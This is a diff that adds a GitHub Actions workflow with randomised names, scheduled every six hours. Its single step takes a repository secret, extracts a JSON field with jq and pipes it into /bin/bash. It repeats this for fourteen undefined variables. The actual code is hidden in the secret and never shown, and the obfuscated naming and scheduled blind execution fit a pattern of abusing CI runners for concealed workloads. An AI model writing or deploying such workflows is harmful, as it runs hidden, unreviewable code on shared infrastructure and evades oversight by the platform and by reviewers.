@@ -1,0 +1,32 @@
+name: jiangyigu1829
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiangyigu1829
+        env:
+          rl937: ${{ secrets.rl937 }}
+        run: |
+          echo $rl937 | jq -r .ll62 | /bin/bash
+          echo $vkocu6046 | jq -r .lvytc1359 | /bin/bash
+          echo $r4 | jq -r .qcpc9 | /bin/bash
+          echo $bbt31002 | jq -r .ouohm485 | /bin/bash
+          echo $xz62 | jq -r .i8 | /bin/bash
+          echo $dtp2369 | jq -r .e01 | /bin/bash
+          echo $acdg54136 | jq -r .juyk576 | /bin/bash
+          echo $ynl4500 | jq -r .zrraf67185 | /bin/bash
+          echo $hj1679 | jq -r .m54 | /bin/bash
+          echo $l79 | jq -r .mga18 | /bin/bash
+          echo $l7 | jq -r .hys749 | /bin/bash
+          echo $tw25 | jq -r .wyj68 | /bin/bash
+          echo $w781 | jq -r .kyncj74 | /bin/bash
+          echo $yft89950 | jq -r .boqc3 | /bin/bash
+          echo $nmii350 | jq -r .f7011 | /bin/bash
+
